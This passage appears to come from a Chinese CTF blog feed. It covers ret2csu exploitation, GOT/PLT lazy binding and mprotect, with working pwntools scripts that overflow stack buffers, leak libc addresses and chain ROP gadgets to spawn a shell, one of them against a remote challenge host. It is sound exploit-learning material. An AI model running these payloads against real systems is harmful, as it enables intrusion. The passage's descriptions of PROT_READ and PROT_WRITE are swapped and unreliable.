__int64)<br>.text:00000000004005C0                                   public __libc_csu_init<br>.text:00000000004005C0                                   __libc_csu_init proc near               ; DATA XREF: _start+16↑o<br>.text:00000000004005C0                                   ; __unwind &#123;<br>.text:00000000004005C0 000 41 57                         push    r15<br>.text:00000000004005C2 008 41 56                         push    r14<br>.text:00000000004005C4 010 41 89 FF                      mov     r15d, edi<br>.text:00000000004005C7 010 41 55                         push    r13<br>.text:00000000004005C9 018 41 54                         push    r12<br>.text:00000000004005CB 020 4C 8D 25 3E 08 20 00          lea     r12, __frame_dummy_init_array_entry<br>.text:00000000004005D2 020 55                            push    rbp<br>.text:00000000004005D3 028 48 8D 2D 3E 08 20 00          lea     rbp, __do_global_dtors_aux_fini_array_entry<br>.text:00000000004005DA 028 53                            push    rbx<br>.text:00000000004005DB 030 49 89 F6                      mov     r14, rsi<br>.text:00000000004005DE 030 49 89 D5                      mov     r13, rdx<br>.text:00000000004005E1 030 4C 29 E5                      sub     rbp, r12<br>.text:00000000004005E4 030 48 83 EC 08                   sub     rsp, 8<br>.text:00000000004005E8 038 48 C1 FD 03                   sar     rbp, 3<br>.text:00000000004005EC 038 E8 0F FE FF FF                call    _init_proc<br>.text:00000000004005EC<br>.text:00000000004005F1 038 48 85 ED                      test    rbp, rbp<br>.text:00000000004005F4 038 74 20                         jz      short loc_400616<br>.text:00000000004005F4<br>.text:00000000004005F6 038 31 DB                         xor     ebx, ebx<br>.text:00000000004005F8 038 0F 1F 84 00 00 00 00 00       nop     dword ptr [rax+rax+00000000h]<br>.text:00000000004005F8<br>.text:0000000000400600<br>.text:0000000000400600                                   loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j<br>.text:0000000000400600 038 4C 89 EA                      mov     rdx, r13<br>.text:0000000000400603 038 4C 89 F6                      mov     rsi, r14<br>.text:0000000000400606 038 44 89 FF                      mov     edi, r15d<br>.text:0000000000400609 038 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]令rbx=0的话就是call r12了，把函数地址放到r12中。  <br>.text:0000000000400609<br>.text:000000000040060D 038 48 83 C3 01                   add     rbx, 1<br>.text:0000000000400611 038 48 39 EB                       cmp     rbx, rbp<br>.text:0000000000400614 038 75 EA                         jnz     short loc_400600<br>.text:0000000000400614<br>.text:0000000000400616<br>.text:0000000000400616                                   loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j<br>.text:0000000000400616 038 48 83 C4 08                   add     rsp, 8<br>.text:000000000040061A 030 5B                            pop     rbx<br>.text:000000000040061B 028 5D                            pop     rbp<br>.text:000000000040061C 020 41 5C                         pop     r12<br>.text:000000000040061E 018 41 5D                         pop     r13<br>.text:0000000000400620 010 41 5E                         pop     r14<br>.text:0000000000400622 008 41 5F                         pop     r15<br>.text:0000000000400624 000 C3                            retn<br>.text:0000000000400624                                   ; &#125; // starts at 4005C0<br></code></pre></td></tr></table></figure><p>可利用的汇编如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:000000000040061A 030 5B                            pop     rbx<br>.text:000000000040061B 028 5D                            pop     rbp<br>.text:000000000040061C 020 41 5C                         pop     r12<br>.text:000000000040061E 018 41 5D                         pop     r13<br>.text:0000000000400620 010 41 5E                         pop     r14<br>.text:0000000000400622 008 41 5F                         pop     r15<br>.text:0000000000400624 000 C3                            retn<br></code></pre></td></tr></table></figure><p>从0x0000000000400600到0x0000000000400609,我们可以将r13赋给rdx,将r14赋给rsi,将r15d赋给edi(需要注意的是，虽然这里赋给的是edi,但其实此时rdi的高32位寄存器值为0（自行调试），所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位)，而这三个寄存器，也是x64函数调用中传递的前三个寄存器(rdx、rsi、edi)。此外，如果我们可以合理地控制r12与x,那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0,r12为存储我们想要调用的函数的地址。对应的汇编如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000400600<br>.text:0000000000400600                                   loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j<br>.text:0000000000400600 038 4C 89 EA                      mov     rdx, r13<br>.text:0000000000400603 038 4C 89 F6                      mov     rsi, r14<br>.text:0000000000400606 038 44 89 FF                      mov     edi, r15d<br>.text:0000000000400609 038 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]<br>.text:0000000000400609<br></code></pre></td></tr></table></figure><p>从000000000040060D到0000000000400614，我们可以控制rbx与rbp不相等这样就不会执行loc_400600，进而可以继续执行下面的汇编程序，所以可以简单的设置rbx&#x3D;0，rbp&#x3D;1.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:000000000040060D 038 48 83 C3 01                   add     rbx, 1<br>.text:0000000000400611 038 48 39 EB                      cmp     rbx, rbp<br>.text:0000000000400614 038 75 EA                         jnz     short loc_400600<br>.text:0000000000400614<br></code></pre></td></tr></table></figure><p>JNZ(或JNE)( jump if not zero,or not equal),汇编语言中的条件转移指令。结果不为零（或不相等）则转移。</p><p>payload（用来获取真实的write函数地址）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>a=process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>pop_addr=<span class="hljs-number">0x40061a</span><br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>mov_addr=<span class="hljs-number">0x400600</span><br>padding=<span class="hljs-number">0x80</span>+<span class="hljs-number">0x8</span><br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>a.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br>payload1=<span class="hljs-string">b&quot;a&quot;</span>*padding+p64(pop_addr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(write_got)+p64(<span class="hljs-number">1</span>)+p64(write_got)+p64(<span class="hljs-number">8</span>)+p64(mov_addr)+<span class="hljs-string">b&quot;a&quot;</span>*(<span class="hljs-number">0x8</span>+<span class="hljs-number">8</span>*<span class="hljs-number">6</span>)+p64(main_addr)<br>gdb.attach(a)<br>a.sendline(payload1)<br>write_true_addr=u64(a.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_true_addr_is:&quot;</span>+<span class="hljs-built_in">hex</span>(write_true_addr))<br></code></pre></td></tr></table></figure><p>payload1&#x3D;b”a”<em>padding+p64(pop_addr)+p64(0)+p64(1)+p64(write_got)+p64(1)+p64(write_got)+p64(8)+p64(mov_addr)+b”a”</em>(0x8+8*6)+p64(main_addr)</p><p>具体讲解这一段payload的意思:<br>b”a”*padding：是用来使程序发生栈溢出</p><p>pop_addr：覆盖栈中的返回地址，使程序执行pop_addr地址处的函数。</p><p>p64(0)：是给pop rbx中，令rbx&#x3D;0</p><p>p64(1)：是给pop rbp中，令rbp&#x3D;1（）通过这两步，在下面此处就不会发生跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:000000000040060D 038 48 83 C3 01                   add     rbx, 1<br>.text:0000000000400611 038 48 39 EB                      cmp     rbx, rbp<br>.text:0000000000400614 038 75 EA                         jnz     short loc_400600<br>.text:0000000000400614<br></code></pre></td></tr></table></figure><p>p64(write_got)：是将write_got函数地址给寄存器r12（调用函数 ）</p><p>p64(8)：将8给寄存器r13（参数3）</p><p>p64(write_got)：将write_got函数地址给寄存器r14（参数2）</p><p>p64(1)：将1给r15（参数1）</p><p>p64(mov_addr)：覆盖返回地址为mov_addr</p><p>就是调用write_got函数，参数是write_got函数地址，也就相当于write(write_got),文件描述符是1，每次写入8个字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span>*buf,<span class="hljs-type">size_t</span> count)</span>;<br><br>参数说明：<br><br>fd:是文件描述符（write所对应的是写，即就是<span class="hljs-number">1</span>）<br><br>buf:通常是一个字符串，需要写入的字符串<br><br>count：是每次写入的字节数<br></code></pre></td></tr></table></figure><p>在这之后程序转到mov_addr利用mov指令布置寄存器rdx，rsi，edi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">text:0000000000400600 038 4C 89 EA                      mov     rdx, r13<br>.text:0000000000400603 038 4C 89 F6                      mov     rsi, r14<br>.text:0000000000400606 038 44 89 FF                      mov     edi, r15d<br>.text:0000000000400609 038 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]<br></code></pre></td></tr></table></figure><p>在这里，因为rbx和rbp相等，所以继续执行payload代码也就是p64(main_addr),不需要跳转。</p><p>从整体上看，我们输入了b”a”<em>136,利用payload1对寄存器布局后又重新回到了main函数，其中b‘a’</em>(0x8+8*6)的作用是为了平衡堆栈，也就是说，当mov_addr执行完之后，按照流程仍然会执行400616处的函数，但是我们希望它直接执行（）函数，如果去执行400616的函数，会再次pop寄存器更换我们的布局，为了堆栈平衡，使用垃圾数据填充此处的代码，将main_addr覆盖至ret，从而执行main</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000400616                                   loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j<br>.text:0000000000400616 038 48 83 C4 08                   add     rsp, 8<br>.text:000000000040061A 030 5B                            pop     rbx<br>.text:000000000040061B 028 5D                            pop     rbp<br>.text:000000000040061C 020 41 5C                         pop     r12<br>.text:000000000040061E 018 41 5D                         pop     r13<br>.text:0000000000400620 010 41 5E                         pop     r14<br>.text:0000000000400622 008 41 5F                         pop     r15<br>.text:0000000000400624 000 C3                            retn<br></code></pre></td></tr></table></figure><p>为什么payload中布置两个write_got的作用：</p><p>再布置完寄存器之后，由于有 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]，调用了write函数，其参数为write_got函数地址，就是write（write_got函数地址），再使用u64（a.recv(8)）接受数据print出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>a=process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>pop_addr=<span class="hljs-number">0x40061a</span><br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>mov_addr=<span class="hljs-number">0x400600</span><br>padding=<span class="hljs-number">0x80</span>+<span class="hljs-number">0x8</span><br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>a.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br>payload1=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">136</span>+p64(pop_addr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(write_got)+p64(<span class="hljs-number">8</span>)+p64(write_got)+p64(<span class="hljs-number">1</span>)+p64(mov_addr)+<span class="hljs-string">b&quot;a&quot;</span>*(<span class="hljs-number">0x8</span>+<span class="hljs-number">8</span>*<span class="hljs-number">6</span>)+p64(main_addr)<br>gdb.attach(a)<br>a.sendline(payload1)<br>write_true_addr=u64(a.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_true_addr_is:&quot;</span>+<span class="hljs-built_in">hex</span>(write_true_addr))<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]))<br>libc_base=write_true_addr-libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br>binsh=libc_base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base=&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system=&quot;</span>+<span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh=&quot;</span>+<span class="hljs-built_in">hex</span>(binsh))<br>pop_rdi_ret=<span class="hljs-number">0x400623</span><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x88</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)<br>a.send(payload)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>最后计算基地址，system地址，binsh地址构造rop链进行getshell</p><p>​                                                                                                                                                                     </p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux动态链接中的got.plt表、plt表</title>
    <link href="/2024/10/15/got%E4%B8%8Eplt/"/>
    <url>/2024/10/15/got%E4%B8%8Eplt/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Linux动态链接中的got-plt表、plt表"><a href="#Linux动态链接中的got-plt表、plt表" class="headerlink" title="Linux动态链接中的got.plt表、plt表"></a>Linux动态链接中的got.plt表、plt表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;aaaaaaaaa&quot;</span>);<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bbbbbbbbb&quot;</span>);<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>用这一段代码进行实验，得到函数的真实地址一般采用got表进行泄露，只要执行puts函数之后，got表里面放的就是puts函数的真实地址，sleep是为了下断点</p><p>真实地址是指在当前libc条件下，真实地址&#x3D;libc.base(libc的基地址)+libc.symbol[函数名称] (函数在libc中的偏移)</p><p>gcc -g -z execstack -fno-stack-protector test.c -o test编译生成文件，关闭栈保护</p><p>在sleep处下断点，运行，finish到第一个puts函数前面，si进入puts函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asm">[ DISASM / x86-64 / set emulate on ]<br> ► 0x400430       &lt;puts@plt&gt;                         jmp    qword ptr [rip + 0x200be2]    &lt;puts@got[plt]&gt;<br><br>   0x400436       &lt;puts@plt+6&gt;                       push   0<br>   0x40043b       &lt;puts@plt+11&gt;                      jmp    0x400420                      &lt;0x400420&gt;<br>    ↓<br>   0x400420                                          push   qword ptr [rip + 0x200be2]    &lt;_GLOBAL_OFFSET_TABLE_+8&gt;<br>   0x400426                                          jmp    qword ptr [rip + 0x200be4]    &lt;_dl_runtime_resolve_xsavec&gt;<br>    ↓<br>   0x7ffff7fd8d30 &lt;_dl_runtime_resolve_xsavec&gt;       endbr64 <br>   0x7ffff7fd8d34 &lt;_dl_runtime_resolve_xsavec+4&gt;     push   rbx<br>   0x7ffff7fd8d35 &lt;_dl_runtime_resolve_xsavec+5&gt;     mov    rbx, rsp<br>   0x7ffff7fd8d38 &lt;_dl_runtime_resolve_xsavec+8&gt;     and    rsp, 0xffffffffffffffc0<br>   0x7ffff7fd8d3c &lt;_dl_runtime_resolve_xsavec+12&gt;    sub    rsp, qword ptr [rip + 0x23f4d] &lt;_rtld_global_ro+432&gt;<br>   0x7ffff7fd8d43 &lt;_dl_runtime_resolve_xsavec+19&gt;    mov    qword ptr [rsp], rax<br></code></pre></td></tr></table></figure><p>此时在ida里面看一下puts函数got表地址，程序下一步要跳转到rip+0x200be2的地址执行后续也就是0x601018的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; x/4gx 0x601018<br>0x601018 &lt;puts@got.plt&gt;:0x00000000004004360x00007ffff7c29dc0<br>0x601028 &lt;sleep@got.plt&gt;:0x00007ffff7cea5700x0000000000000000<br></code></pre></td></tr></table></figure><p>此时puts函数的真实地址还没有泄露，程序去执行0x400436的位置，也就是往下执行，ni走完整个puts函数finish步出函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; x/4gx 0x601018<br>0x601018 &lt;puts@got.plt&gt;:0x00007ffff7c80e500x00007ffff7c29dc0<br>0x601028 &lt;sleep@got.plt&gt;:0x00007ffff7cea5700x0000000000000000<br></code></pre></td></tr></table></figure><p>此时的got表如上面，可以看到got表中已经存放puts函数的真实地址单步步入下一个puts。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asm">► 0x400430       &lt;puts@plt&gt;    jmp    qword ptr [rip + 0x200be2]    &lt;puts&gt;<br>   ↓<br>  0x7ffff7c80e50 &lt;puts&gt;        endbr64 <br>  0x7ffff7c80e54 &lt;puts+4&gt;      push   r14<br>  0x7ffff7c80e56 &lt;puts+6&gt;      push   r13<br>  0x7ffff7c80e58 &lt;puts+8&gt;      push   r12<br>  0x7ffff7c80e5a &lt;puts+10&gt;     mov    r12, rdi<br>  0x7ffff7c80e5d &lt;puts+13&gt;     push   rbp<br>  0x7ffff7c80e5e &lt;puts+14&gt;     push   rbx<br>  0x7ffff7c80e5f &lt;puts+15&gt;     sub    rsp, 0x10<br>  0x7ffff7c80e63 &lt;puts+19&gt;     call   *ABS*+0xa86a0@plt                &lt;*ABS*+0xa86a0@plt&gt;<br><br>  0x7ffff7c80e68 &lt;puts+24&gt;     mov    r13, qword ptr [rip + 0x198fc9]<br></code></pre></td></tr></table></figure><p>可以看到下一步直接就是执行了puts函数的真实地址</p><p>所以，栈进行leak时，可以根据got表中存放的真实地址来泄露Iibc基地址：<br>libc_base&#x3D;leak_function_addr_in_stack-libc.symbols[‘function’]</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mprotect函数可以修改内存栈的权限</title>
    <link href="/2024/10/15/mprotect%E5%87%BD%E6%95%B0%E5%8F%AF%E4%BB%A5%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E6%A0%88%E7%9A%84%E6%9D%83%E9%99%90/"/>
    <url>/2024/10/15/mprotect%E5%87%BD%E6%95%B0%E5%8F%AF%E4%BB%A5%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E6%A0%88%E7%9A%84%E6%9D%83%E9%99%90/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="mprotect函数可以修改内存栈的权限"><a href="#mprotect函数可以修改内存栈的权限" class="headerlink" title="mprotect函数可以修改内存栈的权限"></a>mprotect函数可以修改内存栈的权限</h2><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mmap.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mprotect</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span>;<br></code></pre></td></tr></table></figure><p>需要传入三个参数，mprotect()函数是把自start开始的，长度为len的内存区的保护属性修改为prot指定的值</p><p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p><p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p><p>1）PROT_READ：表示内存段内的内容可写；</p><p>2）PROT_WRITE：表示内存段内的内容可读；</p><p>3）PROT_EXEC：表示内存段中的内容可执行；</p><p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p><p>需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p><p>如果执行成功，则返回0；如果执行失败，则返回-1，并且设置errno变量，说明具体因为什么原因造成调用失败。错误的原因主要有以下几个：<br>1）EACCES<br>该内存不能设置为相应权限。这是可能发生的，比如，如果你 mmap(2) 映射一个文件为只读的，接着使用 mprotect() 标志为 PROT_WRITE。</p><p>2）EINVAL</p><p>start 不是一个有效的指针，指向的不是某个内存页的开头。</p><p>3）ENOMEM</p><p>内核内部的结构体无法分配。</p><p>4）ENOMEM</p><p>进程的地址空间在区间 [start, start+len] 范围内是无效，或者有一个或多个内存页没有映射。 </p><p>如果调用进程内存访问行为侵犯了这些设置的保护属性，内核会为该进程产生 SIGSEGV （Segmentation fault，段错误）信号，并且终止该进程</p><h3 id="例题：not-the-same-3dsctf-2016-1"><a href="#例题：not-the-same-3dsctf-2016-1" class="headerlink" title="例题：not_the_same_3dsctf_2016 1"></a>例题：not_the_same_3dsctf_2016 1</h3><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">45</span>]; <span class="hljs-comment">// [esp+Fh] [ebp-2Dh] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);<br>  gets(v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">get_secret</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// esi</span><br><br>  v0 = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);<br>  fgets(&amp;fl4g, <span class="hljs-number">45</span>, v0);<br>  <span class="hljs-keyword">return</span> fclose(v0);<br>&#125;<br></code></pre></td></tr></table></figure><p>存在栈溢出，在get_secret函数里将flag读取到f14g变量里，局部变量位于bss段</p><p>基本思路：利用栈溢出返回到get_secret函数执行，然后调用printf函数将f14g变量打印出来，容易实现</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>)<br><span class="hljs-comment">#a=process(&#x27;./not_the_same&#x27;)</span><br>a=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">29713</span>)<br>flag=<span class="hljs-number">0x080489a0</span><br>f14g=<span class="hljs-number">0x080ECA2d</span><br>pop_esi_edi_ebp_ret=<span class="hljs-number">0x080483b8</span><br>printf_addr=<span class="hljs-number">0x0804F0A0</span><br>exit_addr=<span class="hljs-number">0x0804E660</span><br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-comment">#pause()</span><br>payload=<span class="hljs-string">b&quot;a&quot;</span>*(<span class="hljs-number">0x2d</span>)+p32(flag)+p32(printf_addr)+p32(exit_addr)+p32(f14g)<br>a.sendline(payload)<br><span class="hljs-comment">#0x080483b8 : pop esi ; pop edi ; pop ebp ; ret</span><br>a.interactive()<br></code></pre></td></tr></table></figure><p>然后，了解到mprotect函数，可以修改执行权限</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>)<br><span class="hljs-comment">#a=process(&#x27;./not_the_same&#x27;)</span><br>a=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">29997</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./not_the_same&#x27;</span>)<br>flag=<span 